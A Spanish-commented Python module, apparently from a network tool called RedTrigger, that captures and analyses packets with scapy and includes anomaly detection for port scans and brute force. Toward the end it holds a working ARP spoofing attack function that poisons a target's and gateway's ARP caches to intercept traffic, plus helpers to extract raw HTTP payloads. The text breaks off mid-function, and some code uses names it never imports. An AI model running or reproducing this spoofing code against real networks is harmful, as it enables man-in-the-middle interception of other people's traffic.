#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Módulo de captura y análisis de paquetes para RedTrigger
'''

import os
import sys
import time
import socket
import struct
import signal
import logging
import threading
from datetime import datetime

# Importar módulo de utilidades
try:
    from utils import (
        get_network_interfaces, get_interface_ip, get_interface_mac,
        is_monitor_mode, run_command, COLORS, format_mac,
        human_readable_size, create_dir_if_not_exists, generate_filename
    )
except ImportError:
    print("Error: No se pudo importar el módulo de utilidades")
    sys.exit(1)

# Intentar importar scapy
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import Ether, ARP
    from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Advertencia: Scapy no está instalado. Algunas funciones de captura de paquetes no estarán disponibles.")
    print("Instale scapy con: pip install scapy")

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

logger = logging.getLogger('redtrigger.packet_capture')

# Clase para la captura y análisis de paquetes
class PacketCapture:
    '''
    Clase para la captura y análisis de paquetes de red
    '''
    def __init__(self, config=None):
        '''
        Inicializa el capturador de paquetes
        '''
        self.config = config or {}
        self.interface = self.config.get('interface', None)
        self.filter = self.config.get('filter', None)
        self.output_file = self.config.get('output_file', None)
        self.packet_count = self.config.get('packet_count', 0)  # 0 = sin límite
        self.timeout = self.config.get('timeout', 0)  # 0 = sin límite
        self.verbose = self.config.get('verbose', False)
        self.stop_capture = False
        self.capture_thread = None
        self.packets = []
        self.packet_callback = None
        self.start_time = None
        self.protocols = {}
        self.hosts = {}
        self.conversations = {}
        self.capture_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'start_time': None,
            'end_time': None,
            'duration': 0
        }
    
    def _packet_handler(self, packet):
        '''
        Manejador de paquetes capturados
        '''
        if self.stop_capture:
            return
        
        # Incrementar contador de paquetes
        self.capture_stats['total_packets'] += 1
        
        # Calcular tamaño del paquete
        packet_size = len(packet)
        self.capture_stats['total_bytes'] += packet_size
        
        # Analizar el paquete
        self._analyze_packet(packet)
        
        # Almacenar el paquete si es necesario
        if self.config.get('store_packets', False):
            self.packets.append(packet)
        
        # Llamar al callback si está definido
        if self.packet_callback:
            self.packet_callback(packet)
        
        # Mostrar información del paquete si verbose está activado
        if self.verbose:
            self._print_packet_info(packet)
        
        # Verificar si se alcanzó el límite de paquetes
        if self.packet_count > 0 and self.capture_stats['total_packets'] >= self.packet_count:
            logger.info(f"Límite de paquetes alcanzado ({self.packet_count})")
            self.stop_capture = True
    
    def _analyze_packet(self, packet):
        '''
        Analiza un paquete y actualiza las estadísticas
        '''
        # Analizar protocolos
        if IP in packet:
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            proto = packet[IP].proto
            
            # Actualizar estadísticas de hosts
            if ip_src not in self.hosts:
                self.hosts[ip_src] = {'packets_sent': 0, 'bytes_sent': 0, 'packets_received': 0, 'bytes_received': 0}
            if ip_dst not in self.hosts:
                self.hosts[ip_dst] = {'packets_sent': 0, 'bytes_sent': 0, 'packets_received': 0, 'bytes_received': 0}
            
            self.hosts[ip_src]['packets_sent'] += 1
            self.hosts[ip_src]['bytes_sent'] += len(packet)
            self.hosts[ip_dst]['packets_received'] += 1
            self.hosts[ip_dst]['bytes_received'] += len(packet)
            
            # Actualizar estadísticas de conversaciones
            conversation = f"{ip_src} <-> {ip_dst}"
            if conversation not in self.conversations:
                self.conversations[conversation] = {'packets': 0, 'bytes': 0, 'start_time': time.time()}
            
            self.conversations[conversation]['packets'] += 1
            self.conversations[conversation]['bytes'] += len(packet)
            self.conversations[conversation]['last_time'] = time.time()
            
            # Identificar protocolo de capa de transporte
            if TCP in packet:
                proto_name = 'TCP'
                sport = packet[TCP].sport
                dport = packet[TCP].dport
                
                # Identificar protocolos de aplicación comunes por puerto
                if sport == 80 or dport == 80:
                    proto_name = 'HTTP'
                elif sport == 443 or dport == 443:
                    proto_name = 'HTTPS'
                elif sport == 22 or dport == 22:
                    proto_name = 'SSH'
                elif sport == 21 or dport == 21:
                    proto_name = 'FTP'
                elif sport == 25 or dport == 25:
                    proto_name = 'SMTP'
                elif sport == 110 or dport == 110:
                    proto_name = 'POP3'
                elif sport == 143 or dport == 143:
                    proto_name = 'IMAP'
                elif sport == 53 or dport == 53:
                    proto_name = 'DNS'
            elif UDP in packet:
                proto_name = 'UDP'
                sport = packet[UDP].sport
                dport = packet[UDP].dport
                
                # Identificar protocolos de aplicación comunes por puerto
                if sport == 53 or dport == 53:
                    proto_name = 'DNS'
                elif sport == 67 or dport == 67 or sport == 68 or dport == 68:
                    proto_name = 'DHCP'
            elif ICMP in packet:
                proto_name = 'ICMP'
            else:
                proto_name = f"IP({proto})"
        elif ARP in packet:
            proto_name = 'ARP'
        elif Ether in packet:
            proto_name = 'Ethernet'
        else:
            proto_name = 'Unknown'
        
        # Actualizar estadísticas de protocolos
        if proto_name not in self.protocols:
            self.protocols[proto_name] = {'packets': 0, 'bytes': 0}
        
        self.protocols[proto_name]['packets'] += 1
        self.protocols[proto_name]['bytes'] += len(packet)
    
    def _print_packet_info(self, packet):
        '''
        Imprime información básica de un paquete
        '''
        if IP in packet:
            src = packet[IP].src
            dst = packet[IP].dst
            proto = packet[IP].proto
            
            if TCP in packet:
                sport = packet[TCP].sport
                dport = packet[TCP].dport
                flags = packet[TCP].flags
                print(f"{COLORS['BLUE']}TCP{COLORS['ENDC']} {src}:{sport} -> {dst}:{dport} [Flags: {flags}] Len: {len(packet)}")
            elif UDP in packet:
                sport = packet[UDP].sport
                dport = packet[UDP].dport
                print(f"{COLORS['GREEN']}UDP{COLORS['ENDC']} {src}:{sport} -> {dst}:{dport} Len: {len(packet)}")
            elif ICMP in packet:
                icmp_type = packet[ICMP].type
                icmp_code = packet[ICMP].code
                print(f"{COLORS['YELLOW']}ICMP{COLORS['ENDC']} {src} -> {dst} Type: {icmp_type} Code: {icmp_code} Len: {len(packet)}")
            else:
                print(f"{COLORS['HEADER']}IP({proto}){COLORS['ENDC']} {src} -> {dst} Len: {len(packet)}")
        elif ARP in packet:
            op = "Request" if packet[ARP].op == 1 else "Reply"
            src_ip = packet[ARP].psrc
            dst_ip = packet[ARP].pdst
            src_mac = packet[ARP].hwsrc
            dst_mac = packet[ARP].hwdst
            print(f"{COLORS['WARNING']}ARP {op}{COLORS['ENDC']} {src_ip} ({src_mac}) -> {dst_ip} ({dst_mac})")
        elif Ether in packet:
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            print(f"{COLORS['BOLD']}Ethernet{COLORS['ENDC']} {src_mac} -> {dst_mac} Len: {len(packet)}")
        else:
            print(f"Paquete desconocido: {packet.summary()}")
    
    def start_capture(self, interface=None, filter=None, output_file=None, packet_count=None, timeout=None, callback=None):
        '''
        Inicia la captura de paquetes
        '''
        if not SCAPY_AVAILABLE:
            logger.error("Scapy no está disponible. No se puede iniciar la captura.")
            return False
        
        # Actualizar configuración si se proporcionan parámetros
        if interface:
            self.interface = interface
        if filter:
            self.filter = filter
        if output_file:
            self.output_file = output_file
        if packet_count is not None:
            self.packet_count = packet_count
        if timeout is not None:
            self.timeout = timeout
        if callback:
            self.packet_callback = callback
        
        # Verificar que se haya especificado una interfaz
        if not self.interface:
            interfaces = get_network_interfaces()
            if not interfaces:
                logger.error("No se encontraron interfaces de red")
                return False
            self.interface = interfaces[0]
            logger.info(f"Usando interfaz por defecto: {self.interface}")
        
        # Reiniciar variables
        self.stop_capture = False
        self.packets = []
        self.protocols = {}
        self.hosts = {}
        self.conversations = {}
        self.capture_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'start_time': time.time(),
            'end_time': None,
            'duration': 0
        }
        
        # Crear directorio para el archivo de salida si es necesario
        if self.output_file:
            output_dir = os.path.dirname(self.output_file)
            if output_dir and not os.path.exists(output_dir):
                try:
                    os.makedirs(output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio para archivo de salida: {str(e)}")
                    return False
        
        # Iniciar captura en un hilo separado
        self.capture_thread = threading.Thread(target=self._capture_thread)
        self.capture_thread.daemon = True
        self.capture_thread.start()
        
        logger.info(f"Captura iniciada en interfaz {self.interface}" + 
                   (f" con filtro '{self.filter}'" if self.filter else "") + 
                   (f", guardando en {self.output_file}" if self.output_file else "") + 
                   (f", límite de {self.packet_count} paquetes" if self.packet_count > 0 else "") + 
                   (f", timeout de {self.timeout} segundos" if self.timeout > 0 else ""))
        
        return True
    
    def _capture_thread(self):
        '''
        Hilo para la captura de paquetes
        '''
        try:
            # Configurar timeout si es necesario
            if self.timeout > 0:
                signal.signal(signal.SIGALRM, self._timeout_handler)
                signal.alarm(self.timeout)
            
            # Iniciar captura
            scapy.sniff(
                iface=self.interface,
                filter=self.filter,
                prn=self._packet_handler,
                store=False,
                stop_filter=lambda x: self.stop_capture
            )
            
            # Desactivar alarma si se configuró un timeout
            if self.timeout > 0:
                signal.alarm(0)
            
            # Actualizar estadísticas finales
            self.capture_stats['end_time'] = time.time()
            self.capture_stats['duration'] = self.capture_stats['end_time'] - self.capture_stats['start_time']
            
            # Guardar captura si se especificó un archivo de salida
            if self.output_file and self.packets:
                try:
                    scapy.wrpcap(self.output_file, self.packets)
                    logger.info(f"Captura guardada en {self.output_file}")
                except Exception as e:
                    logger.error(f"Error al guardar captura: {str(e)}")
            
            logger.info(f"Captura finalizada. {self.capture_stats['total_packets']} paquetes capturados " + 
                       f"({human_readable_size(self.capture_stats['total_bytes'])}) en {self.capture_stats['duration']:.2f} segundos")
        except Exception as e:
            logger.error(f"Error en captura de paquetes: {str(e)}")
        finally:
            # Asegurarse de que la captura se detenga
            self.stop_capture = True
    
    def _timeout_handler(self, signum, frame):
        '''
        Manejador para el timeout de captura
        '''
        logger.info(f"Timeout de captura alcanzado ({self.timeout} segundos)")
        self.stop_capture = True
    
    def stop(self):
        '''
        Detiene la captura de paquetes
        '''
        if not self.stop_capture:
            logger.info("Deteniendo captura...")
            self.stop_capture = True
            
            # Esperar a que el hilo termine
            if self.capture_thread and self.capture_thread.is_alive():
                self.capture_thread.join(2.0)
            
            return True
        return False
    
    def get_stats(self):
        '''
        Obtiene estadísticas de la captura
        '''
        # Actualizar duración si la captura está en curso
        if self.capture_stats['end_time'] is None:
            self.capture_stats['duration'] = time.time() - self.capture_stats['start_time']
        
        # Calcular estadísticas adicionales
        stats = {
            'total_packets': self.capture_stats['total_packets'],
            'total_bytes': self.capture_stats['total_bytes'],
            'duration': self.capture_stats['duration'],
            'packets_per_second': self.capture_stats['total_packets'] / max(1, self.capture_stats['duration']),
            'bytes_per_second': self.capture_stats['total_bytes'] / max(1, self.capture_stats['duration']),
            'protocols': self.protocols,
            'top_hosts': self._get_top_hosts(10),
            'top_conversations': self._get_top_conversations(10)
        }
        
        return stats
    
    def _get_top_hosts(self, limit=10):
        '''
        Obtiene los hosts más activos
        '''
        # Ordenar hosts por tráfico total (enviado + recibido)
        sorted_hosts = sorted(
            self.hosts.items(),
            key=lambda x: x[1]['bytes_sent'] + x[1]['bytes_received'],
            reverse=True
        )
        
        # Limitar a los N hosts más activos
        return dict(sorted_hosts[:limit])
    
    def _get_top_conversations(self, limit=10):
        '''
        Obtiene las conversaciones más activas
        '''
        # Ordenar conversaciones por tráfico total
        sorted_conversations = sorted(
            self.conversations.items(),
            key=lambda x: x[1]['bytes'],
            reverse=True
        )
        
        # Limitar a las N conversaciones más activas
        return dict(sorted_conversations[:limit])
    
    def print_stats(self):
        '''
        Imprime estadísticas de la captura
        '''
        stats = self.get_stats()
        
        print(f"\n{COLORS['HEADER']}Estadísticas de captura:{COLORS['ENDC']}")
        print(f"Total de paquetes: {stats['total_packets']}")
        print(f"Total de bytes: {human_readable_size(stats['total_bytes'])}")
        print(f"Duración: {stats['duration']:.2f} segundos")
        print(f"Paquetes por segundo: {stats['packets_per_second']:.2f}")
        print(f"Tráfico: {human_readable_size(stats['bytes_per_second'])}/s")
        
        print(f"\n{COLORS['BLUE']}Distribución de protocolos:{COLORS['ENDC']}")
        for proto, proto_stats in sorted(stats['protocols'].items(), key=lambda x: x[1]['packets'], reverse=True):
            print(f"  {proto}: {proto_stats['packets']} paquetes ({human_readable_size(proto_stats['bytes'])})")
        
        print(f"\n{COLORS['GREEN']}Hosts más activos:{COLORS['ENDC']}")
        for host, host_stats in stats['top_hosts'].items():
            total_bytes = host_stats['bytes_sent'] + host_stats['bytes_received']
            print(f"  {host}: {host_stats['packets_sent'] + host_stats['packets_received']} paquetes ({human_readable_size(total_bytes)})")
            print(f"    Enviado: {host_stats['packets_sent']} paquetes ({human_readable_size(host_stats['bytes_sent'])})")
            print(f"    Recibido: {host_stats['packets_received']} paquetes ({human_readable_size(host_stats['bytes_received'])})")
        
        print(f"\n{COLORS['YELLOW']}Conversaciones más activas:{COLORS['ENDC']}")
        for conv, conv_stats in stats['top_conversations'].items():
            print(f"  {conv}: {conv_stats['packets']} paquetes ({human_readable_size(conv_stats['bytes'])})")
    
    def save_pcap(self, output_file=None):
        '''
        Guarda los paquetes capturados en un archivo PCAP
        '''
        if not SCAPY_AVAILABLE:
            logger.error("Scapy no está disponible. No se puede guardar la captura.")
            return False
        
        if not self.packets:
            logger.warning("No hay paquetes para guardar")
            return False
        
        if output_file:
            self.output_file = output_file
        
        if not self.output_file:
            # Generar nombre de archivo por defecto
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            self.output_file = f"capture_{timestamp}.pcap"
        
        try:
            # Crear directorio si no existe
            output_dir = os.path.dirname(self.output_file)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Guardar captura
            scapy.wrpcap(self.output_file, self.packets)
            logger.info(f"Captura guardada en {self.output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al guardar captura: {str(e)}")
            return False
    
    def load_pcap(self, input_file):
        '''
        Carga paquetes desde un archivo PCAP
        '''
        if not SCAPY_AVAILABLE:
            logger.error("Scapy no está disponible. No se puede cargar la captura.")
            return False
        
        if not os.path.exists(input_file):
            logger.error(f"El archivo {input_file} no existe")
            return False
        
        try:
            # Cargar paquetes
            self.packets = scapy.rdpcap(input_file)
            
            # Reiniciar estadísticas
            self.protocols = {}
            self.hosts = {}
            self.conversations = {}
            self.capture_stats = {
                'total_packets': len(self.packets),
                'total_bytes': sum(len(p) for p in self.packets),
                'start_time': time.time(),
                'end_time': time.time(),
                'duration': 0
            }
            
            # Analizar paquetes
            for packet in self.packets:
                self._analyze_packet(packet)
            
            logger.info(f"Captura cargada desde {input_file}: {len(self.packets)} paquetes")
            return True
        except Exception as e:
            logger.error(f"Error al cargar captura: {str(e)}")
            return False
    
    def filter_packets(self, filter_expr):
        '''
        Filtra los paquetes capturados según una expresión
        '''
        if not SCAPY_AVAILABLE:
            logger.error("Scapy no está disponible. No se pueden filtrar los paquetes.")
            return []
        
        if not self.packets:
            logger.warning("No hay paquetes para filtrar")
            return []
        
        try:
            # Aplicar filtro usando scapy
            filtered = []
            for packet in self.packets:
                if eval(filter_expr, {'__builtins__': {}}, {'packet': packet, 'IP': IP, 'TCP': TCP, 'UDP': UDP, 'ICMP': ICMP, 'Ether': Ether, 'ARP': ARP}):
                    filtered.append(packet)
            
            logger.info(f"Filtro aplicado: {len(filtered)}/{len(self.packets)} paquetes coinciden")
            return filtered
        except Exception as e:
            logger.error(f"Error al aplicar filtro: {str(e)}")
            return []
    
    def extract_data(self, protocol=None, port=None, save_to_file=False):
        '''
        Extrae datos de los paquetes capturados
        '''
        if not SCAPY_AVAILABLE:
            logger.error("Scapy no está disponible. No se pueden extraer datos.")
            return []
        
        if not self.packets:
            logger.warning("No hay paquetes para extraer datos")
            return []
        
        extracted_data = []
        
        try:
            for packet in self.packets:
                # Filtrar por protocolo si se especifica
                if protocol:
                    if protocol.lower() == 'http' and TCP in packet:
                        if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                            # Extraer datos HTTP
                            if Raw in packet:
                                data = packet[Raw].load
                                extracted_data.append({
                                    'protocol': 'HTTP',
                                    'src': packet[IP].src,
                                    'dst': packet[IP].dst,
                                    'sport': packet[TCP].sport,
                                    'dport': packet[TCP].dport,
                                    'data': data
                                })
                    elif protocol.lower() == 'dns' and UDP in packet and (packet[UDP].dport == 53 or packet[UDP].sport == 53):
                        # Extraer datos DNS
                        if DNS in packet:
                            extracted_data.append({
                                'protocol': 'DNS',
                                'src': packet[IP].src,
                                'dst': packet[IP].dst,
                                'sport': packet[UDP].sport,
                                'dport': packet[UDP].dport,
                                'query': packet[DNS].qd.qname if packet[DNS].qd else None,
                                'type': 'query' if packet[UDP].dport == 53 else 'response'
                            })
                    # Agregar más protocolos según sea necesario
                
                # Filtrar por puerto si se especifica
                elif port and TCP in packet and (packet[TCP].dport == port or packet[TCP].sport == port):
                    # Extraer datos del puerto específico
                    if Raw in packet:
                        data = packet[Raw].load
                        extracted_data.append({
                            'protocol': f"TCP:{port}",
                            'src': packet[IP].src,
                            'dst': packet[IP].dst,
                            'sport': packet[TCP].sport,
                            'dport': packet[TCP].dport,
                            'data': data
                        })
            
            # Guardar datos extraídos en un archivo si se solicita
            if save_to_file and extracted_data:
                output_file = f"extracted_{protocol or port}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(output_file, 'w') as f:
                    for item in extracted_data:
                        f.write(f"Protocolo: {item['protocol']}\n")
                        f.write(f"Origen: {item['src']}:{item.get('sport', 'N/A')}\n")
                        f.write(f"Destino: {item['dst']}:{item.get('dport', 'N/A')}\n")
                        if 'data' in item:
                            try:
                                f.write(f"Datos: {item['data'].decode('utf-8', errors='replace')}\n")
                            except:
                                f.write(f"Datos: [Datos binarios]\n")
                        elif 'query' in item:
                            f.write(f"Consulta: {item['query']}\n")
                            f.write(f"Tipo: {item['type']}\n")
                        f.write("\n" + "-"*50 + "\n")
                logger.info(f"Datos extraídos guardados en {output_file}")
            
            return extracted_data
        except Exception as e:
            logger.error(f"Error al extraer datos: {str(e)}")
            return []
    
    def detect_anomalies(self):
        '''
        Detecta anomalías en el tráfico capturado
        '''
        if not self.packets:
            logger.warning("No hay paquetes para analizar")
            return []
        
        anomalies = []
        
        try:
            # Detectar escaneos de puertos
            port_scan_threshold = 10  # Umbral para considerar un escaneo de puertos
            port_scan_suspects = {}
            
            for packet in self.packets:
                if TCP in packet and IP in packet:
                    src = packet[IP].src
                    dst = packet[IP].dst
                    dport = packet[TCP].dport
                    flags = packet[TCP].flags
                    
                    # Detectar paquetes SYN (posible escaneo)
                    if flags == 'S':
                        key = f"{src}->{dst}"
                        if key not in port_scan_suspects:
                            port_scan_suspects[key] = {'ports': set(), 'count': 0}
                        
                        port_scan_suspects[key]['ports'].add(dport)
                        port_scan_suspects[key]['count'] += 1
            
            # Evaluar sospechosos de escaneo de puertos
            for key, data in port_scan_suspects.items():
                if len(data['ports']) >= port_scan_threshold:
                    src, dst = key.split('->')
                    anomalies.append({
                        'type': 'port_scan',
                        'src': src,
                        'dst': dst,
                        'ports': len(data['ports']),
                        'count': data['count'],
                        'description': f"Posible escaneo de puertos desde {src} a {dst} ({len(data['ports'])} puertos)"
                    })
            
            # Detectar ataques de fuerza bruta
            brute_force_threshold = 5  # Umbral para considerar un ataque de fuerza bruta
            brute_force_suspects = {}
            
            for packet in self.packets:
                if TCP in packet and IP in packet:
                    src = packet[IP].src
                    dst = packet[IP].dst
                    dport = packet[TCP].dport
                    
                    # Servicios comunes para ataques de fuerza bruta
                    if dport in [22, 23, 3389, 5900, 21, 25, 110, 143]:
                        key = f"{src}->{dst}:{dport}"
                        if key not in brute_force_suspects:
                            brute_force_suspects[key] = {'count': 0}
                        
                        brute_force_suspects[key]['count'] += 1
            
            # Evaluar sospechosos de ataques de fuerza bruta
            for key, data in brute_force_suspects.items():
                if data['count'] >= brute_force_threshold:
                    src, dst_port = key.split('->')
                    dst, port = dst_port.split(':')
                    service = {
                        22: 'SSH',
                        23: 'Telnet',
                        3389: 'RDP',
                        5900: 'VNC',
                        21: 'FTP',
                        25: 'SMTP',
                        110: 'POP3',
                        143: 'IMAP'
                    }.get(int(port), f"Puerto {port}")
                    
                    anomalies.append({
                        'type': 'brute_force',
                        'src': src,
                        'dst': dst,
                        'port': int(port),
                        'service': service,
                        'count': data['count'],
                        'description': f"Posible ataque de fuerza bruta desde {src} a {dst} ({service})"
                    })
            
            # Detectar tráfico inusual
            # Implementar más detecciones según sea necesario
            
            return anomalies
        except Exception as e:
            logger.error(f"Error al detectar anomalías: {str(e)}")
            return []
    
    def generate_report(self, output_file=None):
        '''
        Genera un informe de la captura
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"report_{timestamp}.txt"
        
        try:
            # Obtener estadísticas
            stats = self.get_stats()
            
            # Detectar anomalías
            anomalies = self.detect_anomalies()
            
            # Crear directorio si no existe
            output_dir = os.path.dirname(output_file)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Generar informe
            with open(output_file, 'w') as f:
                f.write("=== INFORME DE CAPTURA DE PAQUETES ===\n\n")
                f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Interfaz: {self.interface}\n")
                if self.filter:
                    f.write(f"Filtro: {self.filter}\n")
                f.write("\n")
                
                f.write("--- ESTADÍSTICAS GENERALES ---\n")
                f.write(f"Total de paquetes: {stats['total_packets']}\n")
                f.write(f"Total de bytes: {human_readable_size(stats['total_bytes'])}\n")
                f.write(f"Duración: {stats['duration']:.2f} segundos\n")
                f.write(f"Paquetes por segundo: {stats['packets_per_second']:.2f}\n")
                f.write(f"Tráfico: {human_readable_size(stats['bytes_per_second'])}/s\n")
                f.write("\n")
                
                f.write("--- DISTRIBUCIÓN DE PROTOCOLOS ---\n")
                for proto, proto_stats in sorted(stats['protocols'].items(), key=lambda x: x[1]['packets'], reverse=True):
                    f.write(f"{proto}: {proto_stats['packets']} paquetes ({human_readable_size(proto_stats['bytes'])})\n")
                f.write("\n")
                
                f.write("--- HOSTS MÁS ACTIVOS ---\n")
                for host, host_stats in stats['top_hosts'].items():
                    total_bytes = host_stats['bytes_sent'] + host_stats['bytes_received']
                    f.write(f"{host}: {host_stats['packets_sent'] + host_stats['packets_received']} paquetes ({human_readable_size(total_bytes)})\n")
                    f.write(f"  Enviado: {host_stats['packets_sent']} paquetes ({human_readable_size(host_stats['bytes_sent'])})\n")
                    f.write(f"  Recibido: {host_stats['packets_received']} paquetes ({human_readable_size(host_stats['bytes_received'])})\n")
                f.write("\n")
                
                f.write("--- CONVERSACIONES MÁS ACTIVAS ---\n")
                for conv, conv_stats in stats['top_conversations'].items():
                    f.write(f"{conv}: {conv_stats['packets']} paquetes ({human_readable_size(conv_stats['bytes'])})\n")
                f.write("\n")
                
                if anomalies:
                    f.write("--- ANOMALÍAS DETECTADAS ---\n")
                    for anomaly in anomalies:
                        f.write(f"Tipo: {anomaly['type']}\n")
                        f.write(f"Descripción: {anomaly['description']}\n")
                        f.write("\n")
                
                f.write("=== FIN DEL INFORME ===\n")
            
            logger.info(f"Informe generado en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al generar informe: {str(e)}")
            return False

# Función para capturar paquetes ARP
def capture_arp(interface=None, count=10, timeout=30):
    '''
    Captura paquetes ARP en la red
    '''
    if not SCAPY_AVAILABLE:
        logger.error("Scapy no está disponible. No se puede realizar la captura ARP.")
        return []
    
    if not interface:
        interfaces = get_network_interfaces()
        if not interfaces:
            logger.error("No se encontraron interfaces de red")
            return []
        interface = interfaces[0]
    
    logger.info(f"Capturando paquetes ARP en interfaz {interface}")
    
    try:
        # Configurar captura
        packets = scapy.sniff(
            iface=interface,
            filter="arp",
            count=count,
            timeout=timeout
        )
        
        # Procesar paquetes
        arp_packets = []
        for packet in packets:
            if ARP in packet:
                op = "Request" if packet[ARP].op == 1 else "Reply"
                src_ip = packet[ARP].psrc
                dst_ip = packet[ARP].pdst
                src_mac = packet[ARP].hwsrc
                dst_mac = packet[ARP].hwdst
                
                arp_packets.append({
                    'op': op,
                    'src_ip': src_ip,
                    'dst_ip': dst_ip,
                    'src_mac': src_mac,
                    'dst_mac': dst_mac,
                    'packet': packet
                })
                
                logger.info(f"ARP {op}: {src_ip} ({src_mac}) -> {dst_ip} ({dst_mac})")
        
        return arp_packets
    except Exception as e:
        logger.error(f"Error en captura ARP: {str(e)}")
        return []

# Función para enviar paquetes ARP
def send_arp(target_ip, target_mac=None, source_ip=None, source_mac=None, op="request", interface=None, count=1):
    '''
    Envía paquetes ARP (request o reply)
    '''
    if not SCAPY_AVAILABLE:
        logger.error("Scapy no está disponible. No se pueden enviar paquetes ARP.")
        return False
    
    if not interface:
        interfaces = get_network_interfaces()
        if not interfaces:
            logger.error("No se encontraron interfaces de red")
            return False
        interface = interfaces[0]
    
    # Obtener direcciones IP y MAC de origen si no se especifican
    if not source_ip:
        source_ip = get_interface_ip(interface)
        if not source_ip:
            logger.error(f"No se pudo obtener la IP de la interfaz {interface}")
            return False
    
    if not source_mac:
        source_mac = get_interface_mac(interface)
        if not source_mac:
            logger.error(f"No se pudo obtener la MAC de la interfaz {interface}")
            return False
    
    # Determinar la operación ARP
    arp_op = 1 if op.lower() == "request" else 2  # 1=request, 2=reply
    
    # Para ARP request, la MAC de destino es desconocida (ff:ff:ff:ff:ff:ff)
    if not target_mac and arp_op == 1:
        target_mac = "ff:ff:ff:ff:ff:ff"
    elif not target_mac:
        logger.error("Se requiere la MAC de destino para ARP reply")
        return False
    
    logger.info(f"Enviando ARP {op} a {target_ip} desde {source_ip}")
    
    try:
        # Crear paquete ARP
        ether = Ether(src=source_mac, dst=target_mac)
        arp = ARP(
            hwtype=1,  # Ethernet
            ptype=0x0800,  # IPv4
            hwlen=6,  # MAC length
            plen=4,  # IP length
            op=arp_op,
            hwsrc=source_mac,
            psrc=source_ip,
            hwdst=target_mac,
            pdst=target_ip
        )
        
        # Enviar paquete
        packet = ether/arp
        scapy.sendp(packet, iface=interface, count=count, verbose=0)
        
        logger.info(f"Paquete ARP enviado correctamente")
        return True
    except Exception as e:
        logger.error(f"Error al enviar paquete ARP: {str(e)}")
        return False

# Función para realizar un escaneo de red mediante ARP
def arp_scan(target, interface=None, timeout=3):
    '''
    Realiza un escaneo de red mediante ARP
    '''
    if not SCAPY_AVAILABLE:
        logger.error("Scapy no está disponible. No se puede realizar el escaneo ARP.")
        return []
    
    if not interface:
        interfaces = get_network_interfaces()
        if not interfaces:
            logger.error("No se encontraron interfaces de red")
            return []
        interface = interfaces[0]
    
    logger.info(f"Iniciando escaneo ARP en {target} usando interfaz {interface}")
    
    try:
        # Crear paquetes ARP request
        answered, unanswered = scapy.srp(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target),
            timeout=timeout,
            iface=interface,
            verbose=0
        )
        
        # Procesar respuestas
        hosts = []
        for sent, received in answered:
            hosts.append({
                'ip': received.psrc,
                'mac': received.hwsrc,
                'vendor': None  # Se podría implementar una búsqueda de fabricante por MAC
            })
            logger.info(f"Host encontrado: {received.psrc} ({received.hwsrc})")
        
        logger.info(f"Escaneo ARP completado. Hosts encontrados: {len(hosts)}")
        return hosts
    except Exception as e:
        logger.error(f"Error en escaneo ARP: {str(e)}")
        return []

# Función para realizar un ataque de ARP spoofing
def arp_spoof(target_ip, gateway_ip, interface=None, interval=2, count=None):
    '''
    Realiza un ataque de ARP spoofing
    '''
    if not SCAPY_AVAILABLE:
        logger.error("Scapy no está disponible. No se puede realizar el ataque ARP spoofing.")
        return False
    
    if not interface:
        interfaces = get_network_interfaces()
        if not interfaces:
            logger.error("No se encontraron interfaces de red")
            return False
        interface = interfaces[0]
    
    # Obtener la MAC de la interfaz
    attacker_mac = get_interface_mac(interface)
    if not attacker_mac:
        logger.error(f"No se pudo obtener la MAC de la interfaz {interface}")
        return False
    
    # Obtener las MAC de destino
    target_mac = None
    gateway_mac = None
    
    try:
        # Obtener MAC del objetivo
        target_response = scapy.srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip),
            timeout=2,
            iface=interface,
            verbose=0
        )
        if target_response:
            target_mac = target_response.hwsrc
        else:
            logger.error(f"No se pudo obtener la MAC del objetivo {target_ip}")
            return False
        
        # Obtener MAC del gateway
        gateway_response = scapy.srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip),
            timeout=2,
            iface=interface,
            verbose=0
        )
        if gateway_response:
            gateway_mac = gateway_response.hwsrc
        else:
            logger.error(f"No se pudo obtener la MAC del gateway {gateway_ip}")
            return False
        
        logger.info(f"Iniciando ARP spoofing: {target_ip} ({target_mac}) <-> {gateway_ip} ({gateway_mac})")
        
        # Crear paquetes ARP
        target_packet = Ether()/ARP(
            op=2,  # reply
            psrc=gateway_ip,
            pdst=target_ip,
            hwdst=target_mac,
            hwsrc=attacker_mac
        )
        
        gateway_packet = Ether()/ARP(
            op=2,  # reply
            psrc=target_ip,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            hwsrc=attacker_mac
        )
        
        # Enviar paquetes
        sent_count = 0
        try:
            while True:
                scapy.sendp(target_packet, iface=interface, verbose=0)
                scapy.sendp(gateway_packet, iface=interface, verbose=0)
                sent_count += 1
                
                if count and sent_count >= count:
                    break
                
                time.sleep(interval)
        except KeyboardInterrupt:
            pass
        
        # Restaurar ARP tables
        logger.info("Restaurando tablas ARP...")
        restore_target = Ether()/ARP(
            op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwdst=target_mac,
            hwsrc=gateway_mac
        )
        
